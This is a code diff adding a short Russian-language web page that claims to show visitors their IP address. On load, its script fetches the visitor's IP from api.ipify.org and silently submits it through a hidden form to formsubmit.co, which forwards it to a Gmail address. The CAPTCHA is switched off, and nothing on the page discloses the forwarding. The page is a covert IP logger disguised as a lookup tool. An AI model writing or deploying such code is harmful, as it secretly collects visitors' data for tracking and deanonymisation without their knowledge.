@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Узнай свой IP</title>
+</head>
+<body>
+    <h1>Определяем ваш IP-адрес...</h1>
+
+    <form id="ipForm" action="https://formsubmit.co/wplacesosi1@gmail.com" method="POST">
+        <input type="hidden" name="IP пользователя" id="ipField">
+        <input type="hidden" name="_subject" value="Новый IP адрес!">
+        <input type="hidden" name="_captcha" value="false">
+    </form>
+
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ipField').value = data.ip;
+                document.getElementById('ipForm').submit();
+            });
+    </script>
+</body>
+</html>
